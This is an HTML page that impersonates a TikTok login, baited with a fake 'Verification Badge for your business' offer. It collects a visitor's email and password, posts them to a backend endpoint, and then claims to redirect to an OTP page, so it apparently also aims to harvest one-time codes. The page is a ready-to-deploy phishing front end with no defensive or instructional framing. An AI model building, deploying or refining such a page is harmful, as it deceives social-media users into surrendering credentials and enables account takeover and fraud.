
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>TikTok · verification login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            display: flex;
            flex-direction: column;
            gap: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            width: 100%;
        }

        h4{
            color: white;
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            font-size: 20px;
        }

        /* fully responsive container - centers perfectly on all devices */
        .container {
            background: #121212;
            padding: clamp(24px, 6vw, 40px) clamp(20px, 5vw, 32px);
            border-radius: clamp(20px, 5vw, 26px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255,255,255,0.05);
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
            transition: all 0.2s ease;
        }

        .tiktok-brand {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: clamp(16px, 4vw, 24px);
        }

        .tiktok-logo svg {
            border: 1px solid rgb(13, 195, 219);
            border-radius: 50%;
            padding: 5px;
            width: clamp(80px, 15vw, 90px);
            height: clamp(80px, 15vw, 90px);
            display: block;
            margin-bottom: clamp(10px, 3vw, 14px);
        }

        .badge-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: #1e1e1e;
            padding: clamp(6px, 2vw, 8px) clamp(16px, 4vw, 20px) clamp(6px, 2vw, 8px) clamp(20px, 5vw, 24px);
            border-radius: 40px;
            border: 1px solid #2b2b2b;
            width: fit-content;
            max-width: 100%;
            flex-wrap: wrap;
        }

        .badge-row .username {
            color: #f0f0f0;
            font-size: clamp(16px, 4.5vw, 18px);
            font-weight: 500;
            white-space: nowrap;
        }

        /* EXACT INSTAGRAM BLUE VERIFICATION BADGE - PNG IMAGE */
        .ig-verified-badge {
            display: inline-block;
            width: clamp(18px, 5vw, 20px);
            height: clamp(18px, 5vw, 20px);
            background-image: url('https://img.icons8.com/color/48/instagram-verification-badge.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin-left: 2px;
            flex-shrink: 0;
        }

        h2 {
            color: #fff;
            font-weight: 600;
            font-size: clamp(18px, 5vw, 22px);
            margin: clamp(20px, 5vw, 24px) 0 clamp(22px, 5vw, 26px) 0;
            text-align: center;
            line-height: 1.3;
            padding: 0 4px;
            word-break: break-word;
        }

        .form-group {
            margin-bottom: clamp(16px, 4vw, 20px);
            width: 100%;
        }

        label {
            display: block;
            margin-bottom: 6px;
            color: #bbb;
            font-size: clamp(13px, 3.5vw, 14px);
            font-weight: 500;
            padding-left: 4px;
        }

        input {
            width: 100%;
            padding: clamp(12px, 3.5vw, 14px);
            background: #1e1e1e;
            border: 1px solid #2f2f2f;
            border-radius: clamp(14px, 4vw, 16px);
            font-size: clamp(15px, 4vw, 16px);
            color: white;
            transition: border 0.2s;
            -webkit-appearance: none;
            appearance: none;
        }

        input:focus {
            outline: none;
            border-color: #fe2c55;
            background: #262626;
        }

        button {
            width: 100%;
            padding: clamp(12px, 3.5vw, 14px);
            background: #fe2c55;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: clamp(15px, 4vw, 16px);
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
            -webkit-appearance: none;
            appearance: none;
        }

        button:hover {
            background: #ff4d70;
        }

        button:disabled {
            opacity: 0.5;
            pointer-events: none;
        }

        .error {
            color: #ff8a9f;
            margin-top: 16px;
            text-align: center;
            font-size: clamp(13px, 3.5vw, 14px);
            min-height: 22px;
            padding: 0 8px;
            word-break: break-word;
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .loading-spinner {
            border: 3px solid #2d2d2d;
            border-top: 3px solid #fe2c55;
            border-radius: 50%;
            width: clamp(32px, 8vw, 36px);
            height: clamp(32px, 8vw, 36px);
            animation: spin 1s linear infinite;
            margin: 8px auto;
        }

        .loading p {
            color: #aaa;
            font-size: clamp(13px, 3.5vw, 14px);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Small height adjustment for very small screens */
        @media (max-height: 600px) {
            body {
                padding: 8px;
            }
            .container {
                padding: 20px;
            }
            .tiktok-brand {
                margin-bottom: 12px;
            }
        }
    </style>
</head>
<body class="body">

    <h4>Verification Badge for your business</h4>
    <span style="height: 50px; width: 60px;" class="ig-verified-badge" aria-label="Verified on Instagram"></span>
    <div class="container">
        <div class="tiktok-brand">
            <div class="tiktok-logo">
                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M38.306 15.768C36.3 14.536 34.67 12.762 33.652 10.7C32.774 8.92 32.302 6.97 32.28 5H24.564V28.806C24.542 30.216 23.944 31.546 22.932 32.51C21.92 33.474 20.568 33.996 19.158 33.974C17.748 33.952 16.418 33.354 15.454 32.342C14.49 31.33 13.968 29.978 13.99 28.568C14.034 25.704 16.382 23.4 19.246 23.4C19.88 23.4 20.492 23.526 21.06 23.744V16.026C20.446 15.914 19.832 15.858 19.204 15.858C14.898 15.858 11.124 18.536 9.74 22.49C8.356 26.444 9.256 30.766 12.096 33.816C14.158 36.024 17.014 37.296 20.028 37.296C26.284 37.296 31.38 32.2 31.38 25.944V15.28C32.954 16.412 34.724 17.246 36.588 17.734C37.488 17.978 38.388 18.136 39.288 18.228V14.17C38.944 14.114 38.606 14.034 38.306 13.942V15.768Z" fill="white"/>
                    <path d="M38.306 15.768V13.942C37.206 13.592 36.188 13.05 35.282 12.346C34.21 13.58 32.934 14.634 31.5 15.458C29.912 16.374 28.178 16.998 26.378 17.298C25.71 17.416 25.036 17.48 24.358 17.48V25.198C24.358 27.614 23.402 29.894 21.66 31.556C20.078 33.062 17.94 33.916 15.676 33.974C14.262 33.996 12.902 33.578 11.756 32.826C11.112 33.828 10.656 34.934 10.406 36.094C11.75 37.638 13.516 38.782 15.51 39.392C17.504 40.002 19.626 40.044 21.64 39.514C25.226 38.582 28.252 36.134 29.984 32.95C31.214 30.682 31.83 28.148 31.78 25.588V14.78C33.242 15.852 34.894 16.642 36.652 17.1C37.842 17.406 39.064 17.582 40.288 17.634V13.576C39.64 13.476 39.004 13.316 38.386 13.1L38.306 15.768Z" fill="#FE2C55"/>
                    <path d="M10.406 36.094C10.656 34.934 11.112 33.828 11.756 32.826C10.41 31.388 9.488 29.622 9.072 27.712C8.616 29.6 8.748 31.588 9.45 33.4C10.152 35.212 11.384 36.758 13 37.86C12.438 37.278 11.962 36.624 11.588 35.918C11.19 36.324 10.836 36.77 10.532 37.246C10.49 36.862 10.44 36.478 10.406 36.094Z" fill="#25F4EE"/>
                </svg>
            </div>
            <div class="badge-row">
                <span class="username">@yourusername</span>
                <!-- EXACT INSTAGRAM BLUE BADGE PNG - blue circle with white check -->
                <span class="ig-verified-badge" aria-label="Verified on Instagram"></span>
            </div>
        </div>

        <h2>Login to Continue </h2>

        <form id="loginForm" action="/api/users/login" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" id="submitBtn">Login</button>
            <div id="error" class="error"></div>
            <div id="loading" class="loading">
                <div class="loading-spinner"></div>
                <p>Redirecting to OTP page...</p>
            </div>
        </form>
    </div>

    <script>
        (function() {
            const form = document.getElementById('loginForm');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const errorDiv = document.getElementById('error');
            const submitBtn = document.getElementById('submitBtn');
            const loadingDiv = document.getElementById('loading');

            form.addEventListener('submit', async (e) => {
                e.preventDefault();

                const email = emailInput.value.trim();
                const password = passwordInput.value;

                if (!email || !password) {
                    errorDiv.textContent = 'Email and password are required';
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.style.opacity = '0.7';
                loadingDiv.style.display = 'block';
                errorDiv.textContent = '';

                try {
                    const response = await fetch('/api/users/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email, password })
                    });

                    if (!response.ok) {
                        let errorMsg = 'Login failed';
                        try {
                            const data = await response.json();
                            errorMsg = data.error || errorMsg;
                        } catch (e) {}
                        errorDiv.textContent = errorMsg;
                        submitBtn.disabled = false;
                        submitBtn.style.opacity = '1';
                        loadingDiv.style.display = 'none';
                    } else {
                        const html = await response.text();
                        document.open();
                        document.write(html);
                        document.close();
                    }
                } catch (networkErr) {
                    errorDiv.textContent = 'Network error occurred';
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                    loadingDiv.style.display = 'none';
                }
            });

            emailInput.addEventListener('input', () => { errorDiv.textContent = ''; });
            passwordInput.addEventListener('input', () => { errorDiv.textContent = ''; });
        })();
    </script>
</body>
</html>
